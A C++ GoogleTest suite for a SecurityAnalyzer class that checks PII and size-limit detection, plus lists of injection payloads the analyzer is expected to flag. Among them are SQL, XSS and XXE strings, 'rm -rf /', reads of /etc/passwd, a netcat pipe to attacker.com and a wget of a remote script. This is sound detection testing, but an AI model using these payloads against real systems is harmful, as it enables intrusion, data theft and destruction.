#include <gtest/gtest.h>
#include <fstream>
#include <vector>
#include <filesystem>
#include <string>
#include <algorithm>
#include "../securityAnalyzer/SecurityAnalyzer.h"

namespace fs = std::filesystem;

class SecurityAnalyzerTest : public ::testing::Test {
protected:
    void SetUp() override {
        // Create test directory if it doesn't exist
        test_data_dir = fs::path("test_data");
        fs::create_directories(test_data_dir);
        
        // Create test files
        createTestFile("safe.txt", "This is a safe text document for testing.");
        createTestFile("sensitive.txt", "Here is my phone number: +1234567890");
    }
    
    void TearDown() override {
        // Clean up test files
        try {
            fs::remove_all(test_data_dir);
        } catch (...) {
            // Ignore cleanup errors
        }
    }
    
    void createTestFile(const std::string& filename, const std::string& content) {
        std::ofstream file(test_data_dir / filename);
        file << content;
    }
    
    // --- New helper: create a minimal PDF file containing given text ---
    void createTestPDF(const std::string& filename, const std::string& text) {
        std::ofstream file(test_data_dir / filename, std::ios::binary);
        // Very small, minimal PDF that Poppler can parse. Not production-grade but
        // sufficient for unit testing text extraction.
        const std::string header = "%PDF-1.4\n";
        const std::string body = "1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
                                "2 0 obj << /Type /Pages /Count 1 /Kids [3 0 R] >> endobj\n"
                                "3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 300 144] /Contents 4 0 R >> endobj\n";
        std::string stream = "BT /F1 12 Tf 10 100 Td (" + text + ") Tj ET";
        std::string contentObj = "4 0 obj << /Length " + std::to_string(stream.size()) + " >> stream\n" + stream + "\nendstream endobj\n";
        const std::string xref = "xref 0 5\n0 65535 f \n0000000009 00000 n \n0000000064 00000 n \n0000000126 00000 n \n0000000224 00000 n \n";
        const std::string trailer = "trailer << /Size 5 /Root 1 0 R >>\nstartxref 310\n%%EOF";
        file << header << body << contentObj << xref << trailer;
    }
    
    std::vector<uint8_t> readFile(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary | std::ios::ate);
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> buffer(size);
        file.read(reinterpret_cast<char*>(buffer.data()), size);
        return buffer;
    }
    
    fs::path test_data_dir;
    SecurityAnalyzer analyzer;
};

TEST_F(SecurityAnalyzerTest, TestSafeText) {
    auto result = analyzer.analyzeText("This is a safe text message.");
    EXPECT_TRUE(result.is_safe);
    EXPECT_GT(result.confidence_score, 0.7);
}

TEST_F(SecurityAnalyzerTest, TestSensitiveText) {
    auto result = analyzer.analyzeText("Please contact me at john.doe@example.com");
    EXPECT_FALSE(result.is_safe);
    bool has_pii = std::find(result.detected_issues.begin(), 
                           result.detected_issues.end(), 
                           "PII detected") != result.detected_issues.end();
    EXPECT_TRUE(has_pii);
}

TEST_F(SecurityAnalyzerTest, TestSafeTextFile) {
    auto content = readFile((test_data_dir / "safe.txt").string());
    std::string text(content.begin(), content.end());
    auto result = analyzer.analyzeText(text);
    EXPECT_TRUE(result.is_safe);
}

TEST_F(SecurityAnalyzerTest, TestSensitiveTextFile) {
    auto content = readFile((test_data_dir / "sensitive.txt").string());
    std::string text(content.begin(), content.end());
    auto result = analyzer.analyzeText(text);
    EXPECT_FALSE(result.is_safe);
}

TEST_F(SecurityAnalyzerTest, TestIsContentSafe) {
    EXPECT_TRUE(analyzer.isContentSafe("This is a safe message"));
    EXPECT_FALSE(analyzer.isContentSafe("This is a malicious script: <script>alert('xss')</script>"));
}

TEST_F(SecurityAnalyzerTest, TestSafePDF) {
    // Create a simple safe PDF
    createTestPDF("safe.pdf", "This is a safe PDF document.");
    auto pdf_bytes = readFile((test_data_dir / "safe.pdf").string());
    auto result = analyzer.analyzePDF(pdf_bytes);
    EXPECT_TRUE(result.is_safe);
}

TEST_F(SecurityAnalyzerTest, TestLargeTextFileSizeExceeded) {
    // Create a string slightly larger than 10 MB to trigger size guard
    std::string large_text(10 * 1024 * 1024 + 1, 'A');
    auto result = analyzer.analyzeText(large_text);
    EXPECT_FALSE(result.is_safe);
    bool size_issue = std::find(result.detected_issues.begin(),
                                result.detected_issues.end(),
                                "File size exceeds maximum allowed size") != result.detected_issues.end();
    EXPECT_TRUE(size_issue);
}

// Enhanced code injection detection tests
TEST_F(SecurityAnalyzerTest, TestSQLInjectionDetection) {
    std::vector<std::string> sql_attacks = {
        "SELECT * FROM users WHERE id = '1' OR 1=1--",
        "admin' UNION SELECT password FROM users--",
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' HAVING '1'='1",
        "test'; exec xp_cmdshell('dir')--"
    };
    
    for (const auto& attack : sql_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "SQL injection not detected: " << attack;
        bool has_sql_injection = std::any_of(result.detected_issues.begin(), 
                                           result.detected_issues.end(),
                                           [](const std::string& issue) {
                                               return issue.find("SQL injection") != std::string::npos;
                                           });
        EXPECT_TRUE(has_sql_injection) << "SQL injection issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestXSSDetection) {
    std::vector<std::string> xss_attacks = {
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<div onclick='alert(\"XSS\")'>Click me</div>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "document.write('<script>alert(\"XSS\")</script>')"
    };
    
    for (const auto& attack : xss_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "XSS not detected: " << attack;
        bool has_xss = std::any_of(result.detected_issues.begin(), 
                                 result.detected_issues.end(),
                                 [](const std::string& issue) {
                                     return issue.find("XSS") != std::string::npos;
                                 });
        EXPECT_TRUE(has_xss) << "XSS issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestCommandInjectionDetection) {
    std::vector<std::string> cmd_attacks = {
        "test; rm -rf /",
        "file.txt & echo 'injected'",
        "data | nc attacker.com 1234",
        "input; wget http://malicious.com/script.sh",
        "test; cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "file && rm -rf *"
    };
    
    for (const auto& attack : cmd_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "Command injection not detected: " << attack;
        bool has_cmd_injection = std::any_of(result.detected_issues.begin(), 
                                            result.detected_issues.end(),
                                            [](const std::string& issue) {
                                                return issue.find("command injection") != std::string::npos;
                                            });
        EXPECT_TRUE(has_cmd_injection) << "Command injection issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestNoSQLInjectionDetection) {
    std::vector<std::string> nosql_attacks = {
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "admin\"; return true; var x=\"",
        "{\"$where\": \"this.username == this.password\"}",
        "'; return db.users.find(); var x='",
        "{\"user\": {\"$regex\": \".*\"}, \"pass\": {\"$regex\": \".*\"}}"
    };
    
    for (const auto& attack : nosql_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "NoSQL injection not detected: " << attack;
        bool has_nosql_injection = std::any_of(result.detected_issues.begin(), 
                                              result.detected_issues.end(),
                                              [](const std::string& issue) {
                                                  return issue.find("NoSQL injection") != std::string::npos;
                                              });
        EXPECT_TRUE(has_nosql_injection) << "NoSQL injection issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestPathTraversalDetection) {
    std::vector<std::string> path_attacks = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/shadow",
        "C:\\windows\\system32\\drivers\\etc\\hosts"
    };
    
    for (const auto& attack : path_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "Path traversal not detected: " << attack;
        bool has_path_traversal = std::any_of(result.detected_issues.begin(), 
                                             result.detected_issues.end(),
                                             [](const std::string& issue) {
                                                 return issue.find("path traversal") != std::string::npos;
                                             });
        EXPECT_TRUE(has_path_traversal) << "Path traversal issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestTemplateInjectionDetection) {
    std::vector<std::string> template_attacks = {
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        "#{7*7}",
        "{{config.items()}}",
        "${__import__('os').system('id')}",
        "<%=system('id')%>"
    };
    
    for (const auto& attack : template_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "Template injection not detected: " << attack;
        bool has_template_injection = std::any_of(result.detected_issues.begin(), 
                                                 result.detected_issues.end(),
                                                 [](const std::string& issue) {
                                                     return issue.find("template injection") != std::string::npos;
                                                 });
        EXPECT_TRUE(has_template_injection) << "Template injection issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestCodeExecutionDetection) {
    std::vector<std::string> exec_attacks = {
        "system('rm -rf /')",
        "exec('whoami')",
        "eval('malicious_code')",
        "__import__('os').system('id')",
        "shell_exec('cat /etc/passwd')",
        "file_get_contents('/etc/passwd')",
        "fopen('/etc/shadow', 'r')"
    };
    
    for (const auto& attack : exec_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "Code execution not detected: " << attack;
        bool has_code_exec = std::any_of(result.detected_issues.begin(), 
                                        result.detected_issues.end(),
                                        [](const std::string& issue) {
                                            return issue.find("code execution") != std::string::npos;
                                        });
        EXPECT_TRUE(has_code_exec) << "Code execution issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestXMLXXEDetection) {
    std::vector<std::string> xml_attacks = {
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
        "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>"
    };
    
    for (const auto& attack : xml_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "XML/XXE not detected: " << attack;
        bool has_xml_injection = std::any_of(result.detected_issues.begin(), 
                                            result.detected_issues.end(),
                                            [](const std::string& issue) {
                                                return issue.find("XML") != std::string::npos || 
                                                       issue.find("XXE") != std::string::npos;
                                            });
        EXPECT_TRUE(has_xml_injection) << "XML/XXE issue not flagged for: " << attack;
    }
}

TEST_F(SecurityAnalyzerTest, TestLDAPInjectionDetection) {
    std::vector<std::string> ldap_attacks = {
        ")(cn=*)",
        ")(uid=*)(|(uid=*))",
        "admin*",
        "*admin",
        ")(|(uid=*)(userPassword=*))",
        ")(objectClass=*)"
    };
    
    for (const auto& attack : ldap_attacks) {
        auto result = analyzer.analyzeText(attack);
        EXPECT_FALSE(result.is_safe) << "LDAP injection not detected: " << attack;
        bool has_ldap_injection = std::any_of(result.detected_issues.begin(), 
                                             result.detected_issues.end(),
                                             [](const std::string& issue) {
                                                 return issue.find("LDAP injection") != std::string::npos;
                                             });
        EXPECT_TRUE(has_ldap_injection) << "LDAP injection issue not flagged for: " << attack;
    }
}

int main(int argc, char **argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
